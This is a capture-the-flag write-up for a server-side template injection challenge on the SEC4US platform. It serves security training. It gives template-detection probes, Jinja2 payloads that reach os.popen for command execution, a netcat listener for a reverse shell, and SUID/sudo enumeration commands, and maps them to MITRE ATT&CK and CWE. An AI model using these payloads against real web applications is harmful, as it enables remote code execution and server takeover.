# maq136: Exemplar iniectio

Writeup for the **Exemplar iniectio** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** SSTI  
> **Difficulty:** Medium  
> **Points:** 220

---

## Overview

A web application renders user-supplied input through a server-side template engine without sanitization, enabling Server-Side Template Injection (SSTI) that leads to remote code execution.

## Reconnaissance

Scan the target:

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Browse the application and identify input fields whose values are reflected in the response. Look for template rendering indicators in error messages or page behavior.

## Exploitation

### Step 1: Detect SSTI

Submit mathematical expressions to detect template processing:

```
{{7*7}}
${7*7}
<%= 7*7 %>
```

If `49` appears in the response, SSTI is confirmed. The syntax reveals the template engine (Jinja2, Twig, Mako, etc.).

### Step 2: Identify the Template Engine

Use a decision tree based on which syntax is evaluated:

- `{{7*'7'}}` returning `7777777` indicates Jinja2/Twig
- `{{7*'7'}}` returning `49` indicates Twig
- `${7*7}` indicates Mako or FreeMarker

### Step 3: Escalate to RCE

For Jinja2 (Python):

```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

Alternative MRO chain:

```python
{{''.__class__.__mro__[1].__subclasses__()}}
```

Locate a subprocess class and invoke system commands.

### Step 4: Obtain a Shell

Spawn a reverse shell through the SSTI payload:

```bash
nc -lvnp 4444
```

### Step 5: Retrieve the Flag

Read the flag from the server filesystem.

## Privilege Escalation

Enumerate for escalation after landing a shell:

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

## Security Framework Mapping

### MITRE ATT&CK

| Technique                         | ID        |
|-----------------------------------|-----------|
| Exploit Public-Facing Application | T1190     |
| Command and Scripting Interpreter | T1059.006 |
| Exploitation for Privilege Escalation | T1068 |

### CWE

- **CWE-1336:** Improper Neutralization of Special Elements Used in a Template Engine
- **CWE-94:** Improper Control of Generation of Code (Code Injection)

---

Templates are meant to shape output, not to execute intent; when user input becomes part of the engine, the rendered page obeys a new author.

```
(❍ᴥ❍ʋ)
```

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
